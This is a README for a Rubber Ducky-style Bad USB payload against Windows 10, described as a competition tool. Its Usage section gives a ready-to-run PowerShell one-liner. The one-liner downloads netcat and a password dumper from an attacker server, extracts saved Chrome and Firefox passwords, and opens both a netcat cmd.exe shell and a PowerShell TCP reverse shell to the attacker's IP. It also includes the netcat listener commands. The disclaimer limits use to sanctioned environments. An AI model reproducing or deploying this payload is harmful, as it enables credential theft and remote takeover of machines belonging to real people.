# Windows 10 Bad USB Payload for Cybersecurity Competitions

## Overview
This repository contains a proof-of-concept USB payload inspired by Hak5 tools, designed for ethical cybersecurity competitions. The payload establishes a reverse shell and collects browser passwords in a controlled, isolated environment (e.g., virtual machines). It is intended for educational purposes and testing within competition guidelines only.

## Features
- **Reverse Shell**: Opens a TCP connection to a specified listener for remote access.
- **Browser Password Extraction**: Retrieves stored credentials from Chrome and Firefox.
- **Ethical Use**: Built for sanctioned competition use with explicit organizer consent.

## Prerequisites
- A USB device compatible with Hak5 payloads (e.g., Rubber Ducky).
- A Windows 10 target system (virtualized recommended).
- A server to host payload files and Netcat listeners.
- Tools like WebBrowserPassView (or equivalent) for password extraction.

## Usage
1. **Setup Listener**:
   - Run`nc -lvp 4444` for the reverse shell.
   - Run`nc -lvp 4445` for exfiltrated data.
2. **Host Files**:
   - Upload`nc.exe` and`pass.exe` to your server.
3. **Payload Deployment**:
   - Encode the following into your USB device:
     ```powershell
     IWR -Uri"http://YOUR_SERVER/nc.exe" -OutFile "$env:TEMP\nc.exe"; IWR -Uri"http://YOUR_SERVER/pass.exe" -OutFile "$env:TEMP\pass.exe"; & "$env:TEMP\pass.exe" -nogui -chrome -firefox > "$env:TEMP\loot.txt"; & "$env:TEMP\nc.exe" YOUR_IP 4445 -e cmd.exe;$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex$data 2>&1 | Out-String);$sendback2 =$sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
     ```
4. **Deploy**: Insert the USB into the target system and monitor your listeners.

## Disclaimer
This tool is for educational and competition use only. Unauthorized use outside of sanctioned environments is illegal and unethical. Always obtain explicit permission from system owners.

## License
MIT License - Use responsibly!
